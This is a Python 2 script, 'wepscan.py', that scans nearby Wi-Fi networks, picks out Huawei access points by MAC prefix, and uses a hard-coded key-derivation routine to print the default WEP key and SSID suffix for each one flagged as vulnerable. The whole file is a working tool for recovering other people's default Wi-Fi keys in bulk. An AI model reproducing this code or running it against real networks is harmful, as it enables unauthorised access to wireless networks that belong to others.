#!/usr/bin/env python
#
#   wepscan.py
#   ~~~~~~~~~
#   Scan wifi networks, and get the default key for Huawei AP's.
#  
#   LICENSE: http://opensource.org/licenses/GPL-3.0
#   Not warranty at all.
#
#   ksaver, Jan 2015.
import argparse
import operator
import re
import subprocess
import sys

OUTPUT = " | {0:2} | {1:18} | {2:18} | {3:6} | {4:6} | {5:12} |"
OUTPUT_LINE = OUTPUT.replace("|", "+").format("-" * 2, "-" * 18, "-" * 18,
                             "-" * 6, "-" * 6, "-" * 12)

class line_matcher:
    def __init__(self, regexp, handler):
        self.regexp  = re.compile(regexp)
        self.handler = handler


def check_huaweinic(macaddress):
    """
    This function uses the oui.txt file to get the Huawei MAC Addresses.  
    Original data comes from http://standards.ieee.org/regauth/oui/oui.txt
    These values are known as Organizationally Unique Identifiers (OUIs)
    See http://standards.ieee.org/faqs/OUI.html
    """
    huaweinics = ['001882', '001E10', '0022A1', '002568', '00259E', '00464B', '00E0FC',
                  '04C06F', '0819A6', '0C37DC', '101B54', '10C61F', '1C1D67', '202BC1',
                  '20F3A3', '24DBAC', '283CE4', '285FDB', '286ED4', '308730', '404D8E',
                  '4C1FCC', '4C5499', '4CB16C', '548998', '54A51B', '5C4CA9', '6416F0',
                  '707BE8', '781DBA', '80B686', '80FB06', '84A8E4', '8853D4', 'ACE87B',
                  'BC7670', 'C8D15E', 'CC96A0', 'E0247F', 'F4559C', 'F4C714', 'F83DFF',
                  'FC48EF']
    return macaddress.upper()[:6] in huaweinics

def handle_essid(line, result, networks):
    networks[-1]['ESSID'] = result.group(1)

def handle_new_network(line, result, networks):
    networks.append({})
    networks[-1]['Address'] = result.group(1)

def handle_quality(line, result, networks):
    networks[-1]['Quality'] = result.group(1) + '/' + result.group(2)

def hex2dec(s):
    return int(s, 16)

def mac2wep(macaddress):
    """
    mac2wepkey Huawei HG520 by hochoa@websec.mx - 12/2010 http://websec.mx
    Adapted Sept 2013, by ksaver.
    Argument: Plain Mac Address string.
    Returns: A dictionary with default ESSID suffix and default WEP key.
    """
    i = 0
    mac = []
    while i<12:
        mac.insert(i, hex2dec(macaddress[i]))
        i += 1

    a0  = (0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)
    a1  = (0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15)
    a2  = (0,13,10,7,5,8,15,2,10,7,0,13,15,2,5,8)
    a3  = (0,1,3,2,7,6,4,5,15,14,12,13,8,9,11,10)
    a4  = (0,5,11,14,7,2,12,9,15,10,4,1,8,13,3,6)
    a5  = (0,4,8,12,0,4,8,12,0,4,8,12,0,4,8,12)
    a6  = (0,1,3,2,6,7,5,4,12,13,15,14,10,11,9,8)
    a7  = (0,8,0,8,1,9,1,9,2,10,2,10,3,11,3,11)
    a8  = (0,5,11,14,6,3,13,8,12,9,7,2,10,15,1,4)
    a9  = (0,9,2,11,5,12,7,14,10,3,8,1,15,6,13,4)
    a10 = (0,14,13,3,11,5,6,8,6,8,11,5,13,3,0,14)
    a11 = (0,12,8,4,1,13,9,5,2,14,10,6,3,15,11,7)
    a12 = (0,4,9,13,2,6,11,15,4,0,13,9,6,2,15,11)
    a13 = (0,8,1,9,3,11,2,10,6,14,7,15,5,13,4,12)
    a14 = (0,1,3,2,7,6,4,5,14,15,13,12,9,8,10,11)
    a15 = (0,1,3,2,6,7,5,4,13,12,14,15,11,10,8,9)
    n1  = (0,14,10,4,8,6,2,12,0,14,10,4,8,6,2,12)
    n2  = (0,8,0,8,3,11,3,11,6,14,6,14,5,13,5,13)
    n3  = (0,0,3,3,2,2,1,1,4,4,7,7,6,6,5,5)
    n4  = (0,11,12,7,15,4,3,8,14,5,2,9,1,10,13,6)
    n5  = (0,5,1,4,6,3,7,2,12,9,13,8,10,15,11,14)
    n6  = (0,14,4,10,11,5,15,1,6,8,2,12,13,3,9,7)
    n7  = (0,9,0,9,5,12,5,12,10,3,10,3,15,6,15,6)
    n8  = (0,5,11,14,2,7,9,12,12,9,7,2,14,11,5,0)
    n9  = (0,0,0,0,4,4,4,4,0,0,0,0,4,4,4,4)
    n10 = (0,8,1,9,3,11,2,10,5,13,4,12,6,14,7,15)
    n11 = (0,14,13,3,9,7,4,10,6,8,11,5,15,1,2,12)
    n12 = (0,13,10,7,4,9,14,3,10,7,0,13,14,3,4,9)
    n13 = (0,1,3,2,6,7,5,4,15,14,12,13,9,8,10,11)
    n14 = (0,1,3,2,4,5,7,6,12,13,15,14,8,9,11,10)
    n15 = (0,6,12,10,9,15,5,3,2,4,14,8,11,13,7,1)
    n16 = (0,11,6,13,13,6,11,0,11,0,13,6,6,13,0,11)
    n17 = (0,12,8,4,1,13,9,5,3,15,11,7,2,14,10,6)
    n18 = (0,12,9,5,2,14,11,7,5,9,12,0,7,11,14,2)
    n19 = (0,6,13,11,10,12,7,1,5,3,8,14,15,9,2,4)
    n20 = (0,9,3,10,7,14,4,13,14,7,13,4,9,0,10,3)
    n21 = (0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15)
    n22 = (0,1,2,3,5,4,7,6,11,10,9,8,14,15,12,13)
    n23 = (0,7,15,8,14,9,1,6,12,11,3,4,2,5,13,10)
    n24 = (0,5,10,15,4,1,14,11,8,13,2,7,12,9,6,3)
    n25 = (0,11,6,13,13,6,11,0,10,1,12,7,7,12,1,10)
    n26 = (0,13,10,7,4,9,14,3,8,5,2,15,12,1,6,11)
    n27 = (0,4,9,13,2,6,11,15,5,1,12,8,7,3,14,10)
    n28 = (0,14,12,2,8,6,4,10,0,14,12,2,8,6,4,10)
    n29 = (0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3)
    n30 = (0,15,14,1,12,3,2,13,8,7,6,9,4,11,10,5)
    n31 = (0,10,4,14,9,3,13,7,2,8,6,12,11,1,15,5)
    n32 = (0,10,5,15,11,1,14,4,6,12,3,9,13,7,8,2)
    n33 = (0,4,9,13,3,7,10,14,7,3,14,10,4,0,13,9)
    key = (30,31,32,33,34,35,36,37,38,39,61,62,63,64,65,66)
    ssid =[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']
    
    s1 = (n1[mac[0]])^(a4[mac[1]])^(a6[mac[2]])^(a1[mac[3]])^(a11[mac[4]])^(n20[mac[5]])^(a10[mac[6]])^(a4[mac[7]])^(a8[mac[8]])^(a2[mac[9]])^(a5[mac[10]])^(a9[mac[11]])^5
    s2 = (n2[mac[0]])^(n8[mac[1]])^(n15[mac[2]])^(n17[mac[3]])^(a12[mac[4]])^(n21[mac[5]])^(n24[mac[6]])^(a9[mac[7]])^(n27[mac[8]])^(n29[mac[9]])^(a11[mac[10]])^(n32[mac[11]])^10
    s3 = (n3[mac[0]])^(n9[mac[1]])^(a5[mac[2]])^(a9[mac[3]])^(n19[mac[4]])^(n22[mac[5]])^(a12[mac[6]])^(n25[mac[7]])^(a11[mac[8]])^(a13[mac[9]])^(n30[mac[10]])^(n33[mac[11]])^11
    s4 = (n4[mac[0]])^(n10[mac[1]])^(n16[mac[2]])^(n18[mac[3]])^(a13[mac[4]])^(n23[mac[5]])^(a1[mac[6]])^(n26[mac[7]])^(n28[mac[8]])^(a3[mac[9]])^(a6[mac[10]])^(a0[mac[11]])^10
    ya = (a2[mac[0]])^(n11[mac[1]])^(a7[mac[2]])^(a8[mac[3]])^(a14[mac[4]])^(a5[mac[5]])^(a5[mac[6]])^(a2[mac[7]])^(a0[mac[8]])^(a1[mac[9]])^(a15[mac[10]])^(a0[mac[11]])^13
    yb = (n5[mac[0]])^(n12[mac[1]])^(a5[mac[2]])^(a7[mac[3]])^(a2[mac[4]])^(a14[mac[5]])^(a1[mac[6]])^(a5[mac[7]])^(a0[mac[8]])^(a0[mac[9]])^(n31[mac[10]])^(a15[mac[11]])^4
    yc = (a3[mac[0]])^(a5[mac[1]])^(a2[mac[2]])^(a10[mac[3]])^(a7[mac[4]])^(a8[mac[5]])^(a14[mac[6]])^(a5[mac[7]])^(a5[mac[8]])^(a2[mac[9]])^(a0[mac[10]])^(a1[mac[11]])^7
    yd = (n6[mac[0]])^(n13[mac[1]])^(a8[mac[2]])^(a2[mac[3]])^(a5[mac[4]])^(a7[mac[5]])^(a2[mac[6]])^(a14[mac[7]])^(a1[mac[8]])^(a5[mac[9]])^(a0[mac[10]])^(a0[mac[11]])^14
    ye = (n7[mac[0]])^(n14[mac[1]])^(a3[mac[2]])^(a5[mac[3]])^(a2[mac[4]])^(a10[mac[5]])^(a7[mac[6]])^(a8[mac[7]])^(a14[mac[8]])^(a5[mac[9]])^(a5[mac[10]])^(a2[mac[11]])^7

    wepkey = str(key[ya]) + str(key[yb]) + str(key[yc]) + str(key[yd]) + str(key[ye])
    suffix = str(ssid[s1]) + str(ssid[s2]) + str(ssid[s3]) + str(ssid[s4])
    result = {"Suffix": suffix, "Key": wepkey}
    
    return result

def print_header():
    print OUTPUT_LINE
    print OUTPUT.format("", "NETWORK", "ADDRESS", "SIGNAL", "SUFFIX", "DEFAULT KEY")
    print OUTPUT_LINE

def scan_networks(iface):
    """
    This function uses the 'Python command line wifi scanner' by johnl,
    taken from: http://ubuntuforums.org/showthread.php?t=1604981
    and adapted by ksaver, Sept 2013.
    """
    proc = subprocess.Popen(['/sbin/iwlist', iface, 'scan'], stdout=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    lines = stdout.split('\n')

    networks = []
    matchers = []
    results  = []

    matchers.append(line_matcher(r'\s+Cell \d+ - Address: (\S+)',
                                 handle_new_network))

    matchers.append(line_matcher(r'\s+ESSID:"([^"]+)"', 
                                 handle_essid))

    matchers.append(line_matcher(r'\s+Quality=(\d+)/(\d+)',
                                 handle_quality))
    for line in lines:
        for m in matchers:
            result = m.regexp.match(line)
            if result:
                m.handler(line, result, networks)
                break

    for n in networks:
        results.append(n)

    return results

def main(arguments):
    iface = arguments.interface

    # If -m argument given, just perform mac2wep()
    if arguments.macaddress:
        macaddr = str(arguments.macaddress).upper().replace(':', '')
        if check_huaweinic(macaddr):
            m2w = mac2wep(macaddr)
            print "[+] SUFFIX: %s, DEFAULT WEP KEY: %s\n" % (m2w["Suffix"], m2w["Key"])
        else:
            print "[-] This MAC Address seems to be not vulnerable!"

    else:
        vulnerable_networks = []
        notvulnerable_networks = []
        networks = scan_networks(iface)
        print_header()

        for n in networks:
            if not n.has_key("ESSID"):
                n.update({"ESSID": ""})
            macaddress = n["Address"]
            nic = macaddress.upper().replace(':', '')
            if check_huaweinic(nic):
                n.update(mac2wep(nic))
                vulnerable_networks.append(n)
            else:
                n.update({"Suffix":"", "Key": ""})
                notvulnerable_networks.append(n)

        # Sort lists by Quality key in each item
        vulnerable_networks.sort(key=operator.itemgetter('Quality'), reverse=True)
        notvulnerable_networks.sort(key=operator.itemgetter('Quality'), reverse=True)
        # mix both network lists
        vulnerable_networks.extend(notvulnerable_networks)

        n = 1
        for network in vulnerable_networks:
            print OUTPUT.format(n, network["ESSID"][:18], network["Address"],
                                network["Quality"], network["Suffix"], network["Key"])
            n += 1
        print OUTPUT_LINE


if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.argv.append('--help')

    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--mac-address", dest="macaddress",
                        help="Mac address to wep key (formerly mac2wep).")
    parser.add_argument("-i", "--interface", dest="interface",
                        help="WiFi interface to perform scanning.")

    arguments = parser.parse_args()
    main(arguments)      
